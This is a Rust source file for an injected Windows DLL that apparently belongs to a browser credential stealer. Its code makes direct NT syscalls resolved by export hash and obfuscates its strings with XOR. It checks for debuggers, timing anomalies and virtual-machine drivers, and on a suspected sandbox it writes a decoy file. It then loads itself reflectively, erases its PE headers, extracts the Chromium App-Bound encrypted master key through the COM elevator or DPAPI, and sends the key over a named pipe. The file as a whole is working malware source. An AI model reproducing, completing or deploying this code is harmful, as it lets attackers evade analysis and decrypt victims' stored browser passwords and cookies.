#![allow(non_snake_case, unused)]

mod elevator;
mod dpapi_fallback;
mod pipe;
mod reflect;

mod syscalls {
    //! Direct NT syscalls resolved from ntdll.dll at runtime via DJB2 export hashes.

    use core::arch::asm;
    use std::ffi::c_void;
    use std::mem;
    use std::sync::Once;

    use windows::core::PCWSTR;
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;

    pub type NTSTATUS = i32;

    const H_NT_OPEN_PROCESS: u32 = 0x5003_C058;
    const H_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793_C34C;
    const H_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95F3_A792;
    const H_NT_CREATE_THREAD_EX: u32 = 0xCB0C_2130;
    const H_NT_READ_VIRTUAL_MEMORY: u32 = 0xC240_62E3;
    const H_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x0829_62C8;
    const H_NT_CLOSE: u32 = 0x8B8E_133D;

    #[repr(C)]
    pub struct OBJECT_ATTRIBUTES {
        pub length: u32,
        pub root_directory: HANDLE,
        pub object_name: *mut c_void,
        pub attributes: u32,
        pub security_descriptor: *mut c_void,
        pub security_quality_of_service: *mut c_void,
    }

    impl Default for OBJECT_ATTRIBUTES {
        fn default() -> Self {
            Self {
                length: mem::size_of::<Self>() as u32,
                root_directory: HANDLE::default(),
                object_name: std::ptr::null_mut(),
                attributes: 0,
                security_descriptor: std::ptr::null_mut(),
                security_quality_of_service: std::ptr::null_mut(),
            }
        }
    }

    #[repr(C)]
    pub struct CLIENT_ID {
        pub unique_process: *mut c_void,
        pub unique_thread: *mut c_void,
    }

    #[repr(C)]
    struct ImageExportDirectory {
        _characteristics: u32,
        _time_date_stamp: u32,
        _major: u16,
        _minor: u16,
        _name: u32,
        _base: u32,
        number_of_functions: u32,
        number_of_names: u32,
        address_of_functions: u32,
        address_of_names: u32,
        address_of_name_ordinals: u32,
    }

    fn hash_cstr(name: &[u8]) -> u32 {
        let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        let mut h: u32 = 5381;
        for &b in &name[..end] {
            h = h.wrapping_mul(33).wrapping_add(b as u32);
        }
        h
    }

    unsafe fn export_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
        if module_base.is_null() {
            return None;
        }
        let dos = module_base as *const u16;
        if *dos != 0x5A4D {
            return None;
        }
        let e_lfanew = *(module_base.add(0x3C) as *const i32);
        let nt = module_base.add(e_lfanew as usize);
        if *(nt as *const u32) != 0x0000_4550 {
            return None;
        }
        let opt = nt.add(4 + 20);
        let magic = *(opt as *const u16);
        let export_rva = if magic == 0x20B {
            *(opt.add(112) as *const u32)
        } else if magic == 0x10B {
            *(opt.add(96) as *const u32)
        } else {
            return None;
        };
        if export_rva == 0 {
            return None;
        }
        let exp = &*(module_base.add(export_rva as usize) as *const ImageExportDirectory);
        for i in 0..exp.number_of_names {
            let name_rva = *(module_base
                .add(exp.address_of_names as usize + i as usize * 4) as *const u32);
            let name_ptr = module_base.add(name_rva as usize);
            let name_len = (0..256).find(|&j| *name_ptr.add(j) == 0).unwrap_or(256);
            if hash_cstr(std::slice::from_raw_parts(name_ptr, name_len)) != target_hash {
                continue;
            }
            let ordinal = *(module_base
                .add(exp.address_of_name_ordinals as usize + i as usize * 2) as *const u16)
                as u32;
            let func_rva = *(module_base
                .add(exp.address_of_functions as usize + ordinal as usize * 4) as *const u32);
            return Some(module_base.add(func_rva as usize));
        }
        None
    }

    static mut SYSCALL_NUMBERS: Option<[usize; 7]> = None;
    static INIT: Once = Once::new();

    fn s_ntdll() -> String {
        super::xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
    }

    fn wide(s: &str) -> Vec<u16> {
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;
        OsStr::new(s).encode_wide().chain(Some(0)).collect()
    }

    unsafe fn parse_syscall_number(addr: *const u8) -> Option<usize> {
        let bytes = std::slice::from_raw_parts(addr, 32);
        if bytes.len() >= 8
            && bytes[0] == 0x4C
            && bytes[1] == 0x8B
            && bytes[2] == 0xD1
            && bytes[3] == 0xB8
        {
            return Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as usize);
        }
        for i in 0..bytes.len().saturating_sub(4) {
            if bytes[i] == 0xB8 {
                return Some(
                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]])
                        as usize,
                );
            }
        }
        None
    }

    pub fn init() {
        INIT.call_once(|| {
            unsafe {
                let ntdll_name = wide(&s_ntdll());
                let ntdll = match GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())) {
                    Ok(m) => m,
                    Err(_) => return,
                };
                let base = ntdll.0 as *const u8;
                let hashes = [
                    H_NT_OPEN_PROCESS,
                    H_NT_ALLOCATE_VIRTUAL_MEMORY,
                    H_NT_WRITE_VIRTUAL_MEMORY,
                    H_NT_CREATE_THREAD_EX,
                    H_NT_READ_VIRTUAL_MEMORY,
                    H_NT_PROTECT_VIRTUAL_MEMORY,
                    H_NT_CLOSE,
                ];
                let mut numbers = [0usize; 7];
                for (idx, hash) in hashes.iter().enumerate() {
                    numbers[idx] = export_by_hash(base, *hash)
                        .and_then(|addr| parse_syscall_number(addr))
                        .unwrap_or(0);
                }
                SYSCALL_NUMBERS = Some(numbers);
            }
        });
    }

    unsafe fn ssn(index: usize) -> u32 {
        SYSCALL_NUMBERS.unwrap_unchecked()[index] as u32
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall1(ssn: u32, a1: usize) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            lateout("rax") status,
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") status,
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall5(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall6(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
        a6: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "mov qword ptr [rsp + 0x30], {a6}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(target_arch = "x86_64")]
    unsafe fn do_syscall11(
        ssn: u32,
        a1: usize,
        a2: usize,
        a3: usize,
        a4: usize,
        a5: usize,
        a6: usize,
        a7: usize,
        a8: usize,
        a9: usize,
        a10: usize,
        a11: usize,
    ) -> NTSTATUS {
        let status: NTSTATUS;
        asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov qword ptr [rsp + 0x28], {a5}",
            "mov qword ptr [rsp + 0x30], {a6}",
            "mov qword ptr [rsp + 0x38], {a7}",
            "mov qword ptr [rsp + 0x40], {a8}",
            "mov qword ptr [rsp + 0x48], {a9}",
            "mov qword ptr [rsp + 0x50], {a10}",
            "mov qword ptr [rsp + 0x58], {a11}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            a7 = in(reg) a7,
            a8 = in(reg) a8,
            a9 = in(reg) a9,
            a10 = in(reg) a10,
            a11 = in(reg) a11,
            lateout("rax") status,
            options(nostack),
        );
        status
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall1(_: u32, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall4(_: u32, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall5(_: u32, _: usize, _: usize, _: usize, _: usize, _: usize) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall6(
        _: u32,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
    ) -> NTSTATUS {
        -1
    }

    #[cfg(not(target_arch = "x86_64"))]
    unsafe fn do_syscall11(
        _: u32,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
        _: usize,
    ) -> NTSTATUS {
        -1
    }

    pub unsafe fn nt_open_process(
        process_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *const OBJECT_ATTRIBUTES,
        client_id: *const CLIENT_ID,
    ) -> NTSTATUS {
        init();
        do_syscall4(
            ssn(0),
            process_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            client_id as usize,
        )
    }

    pub unsafe fn nt_allocate_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> NTSTATUS {
        init();
        do_syscall6(
            ssn(1),
            process_handle.0 as usize,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        )
    }

    pub unsafe fn nt_write_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut c_void,
        buffer: *const c_void,
        buffer_size: usize,
        bytes_written: *mut usize,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(2),
            process_handle.0 as usize,
            base_address as usize,
            buffer as usize,
            buffer_size,
            bytes_written as usize,
        )
    }

    pub unsafe fn nt_create_thread_ex(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_routine: *mut c_void,
        argument: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> NTSTATUS {
        init();
        do_syscall11(
            ssn(3),
            thread_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            process_handle.0 as usize,
            start_routine as usize,
            argument as usize,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list as usize,
        )
    }

    pub unsafe fn nt_read_virtual_memory(
        process_handle: HANDLE,
        base_address: *const c_void,
        buffer: *mut c_void,
        buffer_size: usize,
        bytes_read: *mut usize,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(4),
            process_handle.0 as usize,
            base_address as usize,
            buffer as usize,
            buffer_size,
            bytes_read as usize,
        )
    }

    pub unsafe fn nt_protect_virtual_memory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> NTSTATUS {
        init();
        do_syscall5(
            ssn(5),
            process_handle.0 as usize,
            base_address as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        )
    }

    pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
        init();
        do_syscall1(ssn(6), handle.0 as usize)
    }

    pub fn current_process() -> HANDLE {
        HANDLE(-1isize as *mut c_void)
    }

    pub unsafe fn close_handle(handle: HANDLE) -> Result<(), ()> {
        let status = nt_close(handle);
        if status < 0 {
            Err(())
        } else {
            Ok(())
        }
    }

    pub unsafe fn protect_memory(
        base: *mut c_void,
        size: usize,
        new_protect: u32,
    ) -> Result<(), ()> {
        let mut base_ptr = base;
        let mut region_size = size;
        let mut old = 0u32;
        let status = nt_protect_virtual_memory(
            current_process(),
            &mut base_ptr,
            &mut region_size,
            new_protect,
            &mut old,
        );
        if status < 0 {
            Err(())
        } else {
            Ok(())
        }
    }
}

use core::arch::asm;
use std::ffi::c_void;
use std::path::PathBuf;
use std::thread;
use std::time::Duration;

use windows::Win32::{
    Foundation::{BOOL, HINSTANCE, TRUE},
    System::{
        Diagnostics::Debug::IsDebuggerPresent,
        SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
        SystemServices::DLL_PROCESS_ATTACH,
        Threading::{CreateThread, THREAD_CREATION_FLAGS},
    },
};

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;

/// Parameters passed from the injector into `Bootstrap`.
#[repr(C)]
pub struct BootstrapParams {
    pub pipe_name: *const u16,
    pub image_base: *mut c_void,
    pub image_size: usize,
}

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_appb() -> Vec<u8> {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x18]).into_bytes()
}

fn s_user_data_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
    ])
}

fn s_data_root_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
    ])
}

fn s_roaming() -> String {
    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
}

fn s_appdata() -> String {
    xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_localappdata() -> String {
    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_local_state() -> String {
    xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F])
}

fn s_os_crypt_path() -> String {
    xor_str(&[
        0x75, 0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x75, 0x3B, 0x2A, 0x2A, 0x05, 0x38,
        0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
        0x31, 0x3F, 0x23,
    ])
}

fn s_browser_name_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
    ])
}

fn s_chromium() -> String {
    xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
}

fn s_decoy_name() -> String {
    xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_decoy_body() -> String {
    xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
    ])
}

struct EnvGuard;

impl Drop for EnvGuard {
    fn drop(&mut self) {
        let _ = std::env::remove_var(s_user_data_env());
        let _ = std::env::remove_var(s_data_root_env());
    }
}

fn is_debugger_attached() -> bool {
    unsafe { IsDebuggerPresent().as_bool() }
}

#[cfg(target_arch = "x86_64")]
fn rdtsc_anomaly() -> bool {
    let (t0, t1) = unsafe {
        let a: u64;
        let b: u64;
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") a,
            lateout("rdx") _,
        );
        for _ in 0..512 {
            core::hint::black_box(0u8);
        }
        asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") b,
            lateout("rdx") _,
        );
        (a, b)
    };
    t1.saturating_sub(t0) > 500_000
}

#[cfg(not(target_arch = "x86_64"))]
fn rdtsc_anomaly() -> bool {
    false
}

fn is_restricted_host() -> bool {
    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_ok() && status.ullTotalPhys < MIN_MEMORY_BYTES {
            return true;
        }
    }
    if thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
    {
        return true;
    }
    let drivers = std::env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers");
    [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
    ]
    .iter()
    .any(|name| drivers.join(name).exists())
}

fn run_decoy() {
    let _ = std::fs::write(std::env::temp_dir().join(s_decoy_name()), s_decoy_body());
}

/// Reflective entry point invoked by the injector via `NtCreateThreadEx`.
/// Performs PE mapping (relocations/imports), connects to the named pipe, and
/// runs the COM elevation workflow.
#[no_mangle]
pub unsafe extern "C" fn Bootstrap(params: *const BootstrapParams) -> u32 {
    if params.is_null() {
        return 1;
    }
    let p = &*params;
    if p.image_base.is_null() || p.image_size == 0 {
        return 1;
    }

    if is_debugger_attached() || rdtsc_anomaly() {
        thread::sleep(Duration::from_secs(30));
        return 1;
    }
    if is_restricted_host() {
        run_decoy();
        return 1;
    }

    if reflect::load_pe(p.image_base, p.image_size).is_err() {
        let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| {
            c.send_error(&xor_str(&[
                0x28, 0x3F, 0x36, 0x3F, 0x39, 0x2E, 0x33, 0x3C, 0x3F, 0x7A, 0x36, 0x35, 0x3B, 0x3E,
                0x7A, 0x3C, 0x3B, 0x33, 0x36, 0x3F, 0x3E,
            ]))
        });
        return 1;
    }

    reflect::destroy_pe_headers(p.image_base);

    match run_with_pipe(p) {
        Ok(()) => 0,
        Err(e) => {
            let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| c.send_error(&e));
            1
        }
    }
}

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        CreateThread(None, 0, Some(legacy_worker), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

unsafe extern "system" fn legacy_worker(_: *mut c_void) -> u32 {
    0
}

unsafe fn run_with_pipe(params: &BootstrapParams) -> Result<(), String> {
    let _env_guard = EnvGuard;
    thread::sleep(Duration::from_millis(200));

    let client = pipe::connect_pipe_name(params.pipe_name)
        .map_err(|_| String::from("pipe connect failed"))?;
    client
        .send_status("connected")
        .map_err(|_| String::from("pipe status failed"))?;

    let r = std::panic::catch_unwind(|| run_core(&client));
    match r {
        Ok(Ok(key_hex)) => {
            let browser = std::env::var(s_browser_name_env()).unwrap_or_else(|_| s_chromium());
            client
                .send_result(&key_hex, &browser)
                .map_err(|_| String::from("pipe result failed"))?;
            Ok(())
        }
        Ok(Err(e)) => {
            let _ = client.send_error(&e);
            Err(e)
        }
        Err(_) => {
            let msg = String::from("panic");
            let _ = client.send_error(&msg);
            Err(msg)
        }
    }
}

fn run_core(client: &pipe::PipeClient) -> Result<String, String> {
    client
        .send_status("reading local state")
        .map_err(|_| String::from("pipe status failed"))?;

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("read Local State: {e}"))?;
    let ls: serde_json::Value = serde_json::from_str(&raw)
        .map_err(|e| format!("parse Local State: {e}"))?;

    let key_b64 = ls
        .pointer(&s_os_crypt_path())
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            xor_str(&[
                0x3B, 0x2A, 0x2A, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
                0x31, 0x3F, 0x23, 0x7A, 0x34, 0x35, 0x2E, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E,
            ])
        })?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    )
    .map_err(|e| format!("base64 decode: {e}"))?;

    let appb = s_appb();
    if encrypted_key.len() < appb.len() {
        return Err(xor_str(&[
            0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x31, 0x3F, 0x23, 0x7A,
            0x2E, 0x35, 0x35, 0x7A, 0x29, 0x32, 0x35, 0x28, 0x2E,
        ]));
    }
    if !encrypted_key.starts_with(&appb) {
        return Err(xor_str(&[
            0x37, 0x33, 0x29, 0x29, 0x33, 0x34, 0x3D, 0x7A, 0x1B, 0x0A, 0x0A, 0x18, 0x7A, 0x2A,
            0x28, 0x3F, 0x3C, 0x33, 0x22,
        ]));
    }
    let encrypted_key = &encrypted_key[appb.len()..];

    client
        .send_status("calling com server")
        .map_err(|_| String::from("pipe status failed"))?;

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
        None => elevator::decrypt_app_bound_key(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from("dpapi fallback failed"))
        })
        .map_err(|e| format!("key recovery: {e}"))?;

    if master_key.len() != 32 {
        return Err(format!(
            "unexpected key length: {} (want 32)",
            master_key.len()
        ));
    }

    client
        .send_status(&xor_str(&[0x31, 0x3F, 0x23, 0x7A, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x3E, 0x3F, 0x3E]))
        .map_err(|_| xor_str(&[0x33, 0x2A, 0x39, 0x7A, 0x29, 0x2E, 0x3B, 0x2E, 0x2F, 0x29]))?;

    let hex = master_key.iter().map(|b| format!("{b:02x}")).collect::<String>();
    Ok(hex)
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    if let Ok(rel) = std::env::var(s_user_data_env()) {
        let root = match std::env::var(s_data_root_env()).as_deref() {
            Ok(v) if v == s_roaming() => std::env::var(s_appdata()),
            _ => std::env::var(s_localappdata()),
        }
        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;

        let path = PathBuf::from(&root).join(rel).join(s_local_state());
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("Local State not found: {}", path.display()));
    }

    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;

    let local_appdata = std::env::var(s_localappdata()).map_err(|_| "LOCALAPPDATA not set")?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(&browser.user_data_rel)
        .join(s_local_state());

    if !local_state_path.exists() {
        return Err(format!(
            "Local State not found: {}",
            local_state_path.display()
        ));
    }

    Ok(local_state_path)
}
